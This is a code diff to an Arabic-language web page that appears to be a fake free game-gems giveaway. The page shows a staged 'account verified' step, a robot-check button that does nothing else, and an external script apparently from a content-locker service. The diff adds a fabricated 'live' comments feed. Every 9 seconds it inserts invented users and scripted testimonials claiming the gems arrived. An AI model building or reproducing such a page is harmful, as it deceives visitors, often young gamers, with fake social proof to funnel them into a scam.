@@ -25,14 +25,14 @@ gtag('config', 'G-WQ0798RDQ2');
 :root { --primary:#ffcc00; --red:#e41e26; --dark-text:#1e293b; }
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
 body{
-background:#ffffff;
+background:#f1f5f9;
 color:var(--dark-text);
 font-family:'Cairo',sans-serif;
 margin:0;
 display:flex;
 flex-direction:column;
 align-items:center;
-justify-content:center;
+padding: 20px 0;
 min-height:100vh;
 }
 .main-container{
@@ -44,6 +44,7 @@ padding:25px;
 border:3px solid var(--primary);
 box-shadow:0 10px 30px rgba(0,0,0,0.1);
 text-align:center;
+margin-bottom: 20px;
 }
 .game-title{font-weight:900;font-size:1.8rem;color:var(--red);margin-bottom:20px;}
 .step-card{display:none;flex-direction:column;align-items:center;}
@@ -114,15 +115,23 @@ border-radius:8px;
 border:1px solid #bcf0da;
 }
 .error{color:#ff4b2b;font-size:13px;margin-bottom:10px;display:none;font-weight:bold;}
+#robot-msg { color: red; font-weight: bold; margin-bottom: 10px; display: none; font-size: 1.1rem; }
 
-/* ستايل الرسالة الحمراء */
-#robot-msg {
-    color: red;
-    font-weight: bold;
-    margin-bottom: 10px;
-    display: none;
-    font-size: 1.1rem;
-}
+/* ستايل التعليقات الحيّة */
+.comments-section { width: 92%; max-width: 420px; background: #fff; border-radius: 15px; padding: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
+.comment-header { font-size: 14px; font-weight: bold; border-bottom: 1px solid #eee; padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
+.live-indicator { color: #10b981; font-size: 11px; display: flex; align-items: center; gap: 4px; }
+.dot { width: 7px; height: 7px; background: #10b981; border-radius: 50%; animation: blink 1s infinite; }
+@keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+.comment-box { border-bottom: 1px solid #f1f5f9; padding: 10px 0; display: flex; gap: 10px; animation: slideDown 0.4s ease-out; }
+@keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+.user-avatar { width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; flex-shrink: 0; font-size: 14px; }
+.user-name { font-weight: bold; font-size: 13px; margin: 0; color: #334155; }
+.comment-text { font-size: 12.5px; margin: 2px 0; color: #475569; line-height: 1.4; }
+.comment-time { font-size: 10px; color: #94a3b8; }
+.add-comment-area { margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px; }
+.comment-input { width: 100%; padding: 8px; border-radius: 8px; border: 1px solid #cbd5e1; font-family: inherit; font-size: 13px; outline: none; background: #f8fafc; }
+.post-btn { background: #3b82f6; color: white; border: none; padding: 6px 15px; border-radius: 5px; margin-top: 5px; font-size: 12px; cursor: pointer; float: left; font-weight: bold; }
 </style>
 </head>
 
@@ -158,14 +167,24 @@ border:1px solid #bcf0da;
 
 <div id="fin" style="display:none;">
 <p class="final-msg">✅ تم التحقق من الحساب بنجاح.</p>
-
 <div id="robot-msg">🔴 الرجاء تأكيد أنك لست روبوت</div>
-
 <div data-captcha-enable="true"></div>
-
 <button class="btn-red" style="background:var(--primary);color:#000;box-shadow:0 4px 0 #b79500;" onclick="final()">اضغط للتحقق الأخير</button>
 </div>
 </div>
+</div>
+
+<div class="comments-section">
+    <div class="comment-header">
+        <span>التعليقات (3)</span>
+        <div class="live-indicator"><span class="dot"></span> مباشر</div>
+    </div>
+    <div id="comments-list"></div>
+    <div class="add-comment-area">
+        <textarea id="user-msg" class="comment-input" rows="1" placeholder="اكتب تعليقك هنا..."></textarea>
+        <button class="post-btn" onclick="userPost()">إرسال</button>
+        <div style="clear: both;"></div>
+    </div>
 </div>
 
 <script>
@@ -203,13 +222,44 @@ document.getElementById('wait-text').innerText="اكتمل الفحص!";
 },1000);
 }
 
-// دالة الزر الأخير: تظهر الرسالة فقط
 function final(){
     document.getElementById('robot-msg').style.display = 'block';
 }
+
+// برمجة التعليقات
+const names = ["خالد س.", "سلطان الحربي", "Yousef FF", "مريم العلي", "فهد القحطاني"];
+const texts = ["شكراً وصلتني الجواهر!", "والله صادقين شحنت 1080 جوهرة", "أفضل موقع شحن جربته", "الطريقة شغالة 100% يا شباب"];
+const colors = ["#3b82f6", "#10b981", "#f59e0b", "#ef4444"];
+
+function createCommentHTML(name, text, color) {
+    return `<div class="comment-box"><div class="user-avatar" style="background:${color}">${name.charAt(0)}</div><div class="comment-content"><p class="user-name">${name}</p><p class="comment-text">${text}</p><p class="comment-time">الآن</p></div></div>`;
+}
+
+function updateComments(html) {
+    const list = document.getElementById('comments-list');
+    list.insertAdjacentHTML('afterbegin', html);
+    if (list.children.length > 3) list.removeChild(list.lastChild);
+}
+
+function userPost() {
+    const input = document.getElementById('user-msg');
+    if(input.value.trim() !== "") {
+        updateComments(createCommentHTML("زائر", input.value, "#64748b"));
+        input.value = "";
+    }
+}
+
+window.onload = () => {
+    updateComments(createCommentHTML("محمد أ.", "تم استلام المكافأة شكراً", "#3b82f6"));
+    setInterval(() => {
+        const name = names[Math.floor(Math.random() * names.length)];
+        const text = texts[Math.floor(Math.random() * texts.length)];
+        const color = colors[Math.floor(Math.random() * colors.length)];
+        updateComments(createCommentHTML(name, text, color));
+    }, 9000);
+};
 </script>
 
 <script type="text/javascript" src="https://lockedpage1.website/cp/js/dxdkp"></script>
-
 </body>
 </html>
